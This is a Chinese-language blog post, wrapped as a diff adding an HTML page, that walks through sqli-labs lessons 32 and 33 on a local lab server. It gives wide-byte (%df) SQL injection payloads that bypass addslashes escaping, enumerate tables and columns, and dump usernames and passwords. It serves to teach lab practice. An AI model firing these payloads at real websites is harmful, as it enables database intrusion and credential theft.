@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>sql-labs-Less-32~33 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Less-32 进入http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-32&#x2F;，输入?id&#x3D;1,正常输出，再输入&#39;还是正常， 看到下面的提示：  发现输入的’被转义成&#39;，查看源代码: 意思大概就是在’、”、\前面加上一个\使他们被转义，所以我们用普通的方法不能注入。我们输入http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-32&#x2F;?id&#x3D;1%df&#39;(这里不一定要用%df，只要能和%">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql-labs-Less-32~33">
+<meta property="og:url" content="http://example.com/2021/02/20/sql-labs-Less-32~33/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Less-32 进入http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-32&#x2F;，输入?id&#x3D;1,正常输出，再输入&#39;还是正常， 看到下面的提示：  发现输入的’被转义成&#39;，查看源代码: 意思大概就是在’、”、\前面加上一个\使他们被转义，所以我们用普通的方法不能注入。我们输入http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-32&#x2F;?id&#x3D;1%df&#39;(这里不一定要用%df，只要能和%">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/20/sql-labs-Less-32~33/1.png">
+<meta property="og:image" content="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/20/sql-labs-Less-32~33/2.png">
+<meta property="og:image" content="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/20/sql-labs-Less-32~33/3.png">
+<meta property="article:published_time" content="2021-02-20T05:08:39.000Z">
+<meta property="article:modified_time" content="2021-02-20T09:14:59.460Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/20/sql-labs-Less-32~33/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-sql-labs-Less-32~33" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/20/sql-labs-Less-32~33/" class="article-date">
+  <time datetime="2021-02-20T05:08:39.000Z" itemprop="datePublished">2021-02-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      sql-labs-Less-32~33
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1>Less-32</h1>
+进入http://127.0.0.1/sql/Less-32/，输入?id=1,正常输出，再输入'还是正常，
+看到下面的提示：
+
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/20/sql-labs-Less-32~33/1.png" alt="1"><br>发现输入的’被转义成&#39;，查看源代码:</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/20/sql-labs-Less-32~33/2.png" alt="2"><br>意思大概就是在’、”、\前面加上一个\使他们被转义，所以我们用普通的方法不能注入。<br>我们输入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-32/?id=1%EF%BF%BD&#39;(%E8%BF%99%E9%87%8C%E4%B8%8D%E4%B8%80%E5%AE%9A%E8%A6%81%E7%94%A8%df%EF%BC%8C%E5%8F%AA%E8%A6%81%E8%83%BD%E5%92%8C%5c%E7%BB%84%E6%88%90%E4%B8%80%E4%B8%AA%E6%B1%89%E5%AD%97%E5%B0%B1%E8%A1%8C%EF%BC%8C%E5%A6%82%aa,%bb,%cc...)%EF%BC%8C%E5%8F%91%E7%94%9F%E6%8A%A5%E9%94%99%EF%BC%8C%E9%80%9A%E8%BF%87%E5%9B%9E%E6%98%BE%E4%BF%A1%E6%81%AF%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%87%BA%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E6%98%AF&#39;%EF%BC%8C%E5%86%8D%E8%BE%93%E5%85%A5--+%EF%BC%8C%E6%AD%A3%E5%B8%B8%E8%BE%93%E5%87%BA%EF%BC%8C%E8%AF%B4%E6%98%8E%E5%8F%AF%E4%BB%A5%E7%94%A8&#39;%E6%B3%A8%E5%85%A5%E3%80%82">http://127.0.0.1/sql/Less-32/?id=1%df&#39;(这里不一定要用%df，只要能和%5c组成一个汉字就行，如%aa,%bb,%cc...)，发生报错，通过回显信息可以看出注入字符是&#39;，再输入--+，正常输出，说明可以用&#39;注入。</a><br>可以用联合注入、报错注入和延时注入。<br>这里用联合注入：<br>查列数：<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1%EF%BF%BD&#39;">http://127.0.0.1/sql/Less-27/?id=1%df&#39;</a> order by 3–+<br>测位置：<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-32/?id=1%EF%BF%BD&#39;union">http://127.0.0.1/sql/Less-32/?id=1%df&#39;union</a> select 1,2,3–+<br>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-32/?id=1%EF%BF%BD&#39;union">http://127.0.0.1/sql/Less-32/?id=1%df&#39;union</a> select 1,database(),3–+<br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-32/?id=331%EF%BF%BD&#39;">http://127.0.0.1/sql/Less-32/?id=331%df&#39;</a> union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),3–+<br>（’0x7365637572697479‘是security的16进制，这里用是因为会对’进行转义，然后就出错，16进制转换：hackbar&gt;&gt;encoding&gt;&gt;hex encode）<br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-32/?id=331%EF%BF%BD&#39;">http://127.0.0.1/sql/Less-32/?id=331%df&#39;</a> union select 1,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),3–+<br>爆数据：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-32/?id=331%EF%BF%BD&#39;">http://127.0.0.1/sql/Less-32/?id=331%df&#39;</a> union select 1,(select group_concat(username) from users),(select group_concat(password) from users)–+</p>
+<h1>Less-33</h1>
+查看源代码:
+
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/20/sql-labs-Less-32~33/3.png" alt="3"><br>发现里面有一个addslashes函数，（addslashes函数的作用是在预定义字符前加一个\进行转义）。<br>方法一：直接宽字节注入。<br>方法二：把加上的\转义或闭合（%aa%5c’）<br>查列数：<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-32/?id=1%EF%BF%BD%5C&#39;">http://127.0.0.1/sql/Less-32/?id=1%df%5c&#39;</a> order by 3–+<br>测位置：<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-32/?id=1%EF%BF%BD%5C&#39;union">http://127.0.0.1/sql/Less-32/?id=1%df%5c&#39;union</a> select 1,2,3–+<br>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-32/?id=1%EF%BF%BD%5C&#39;union">http://127.0.0.1/sql/Less-32/?id=1%df%5c&#39;union</a> select 1,database(),3–+<br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-32/?id=331%EF%BF%BD%5C&#39;">http://127.0.0.1/sql/Less-32/?id=331%df%5c&#39;</a> union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),3–+<br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-32/?id=331%EF%BF%BD%5C&#39;">http://127.0.0.1/sql/Less-32/?id=331%df%5c&#39;</a> union select 1,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),3–+<br>爆数据：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-32/?id=331%EF%BF%BD%5C&#39;">http://127.0.0.1/sql/Less-32/?id=331%df%5c&#39;</a> union select 1,(select group_concat(username) from users),(select group_concat(password) from users)–+</p>
+<h1>宽字节注入</h1>
+
+<p>宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。<br>宽字节带来的安全问题主要是ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。<br>中文、韩文、日文等均存在宽字节，英文默认都是一个字节。在使用PHP连接MySQL的时候，<br>当设置“set  character_set_client = gbk”时会导致一个编码转换的问题。</p>
+<p>例子：   id= 1’处理1\’进行编码1%5c%27带入sql后id=\’and XXXX此时无法完成注入<br>         id=1%df’处理1%df\’进行编码1%df%5c%27带入sql后id=1運’and XXX 此时存在宽字节注入漏洞</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/helloc0de/article/details/76180190">https://blog.csdn.net/helloc0de/article/details/76180190</a><br>          <a target="_blank" rel="noopener" href="https://blog.csdn.net/heiseweiye/article/details/82723478">https://blog.csdn.net/heiseweiye/article/details/82723478</a><br>推荐解码网站：<a target="_blank" rel="noopener" href="http://www.mytju.com/classcode/tools/urldecode_gb2312.asp">http://www.mytju.com/classcode/tools/urldecode_gb2312.asp</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/20/sql-labs-Less-32~33/" data-id="ckldiat8x0000p4ux2k5i0ng9" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/02/18/sql-labs-Less-29-31/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">sql-labs-Less-29~31</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/02/20/sql-labs-Less-32~33/">sql-labs-Less-32~33</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/18/sql-labs-Less-29-31/">sql-labs-Less-29~31</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/17/sql-labs-Less-28-28a/">sql-labs-Less-28-28a</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/17/sql-labs-Less-27a/">sql-labs-Less-27a</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/17/sql-labs-Less-27/">sql-labs-Less-27</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
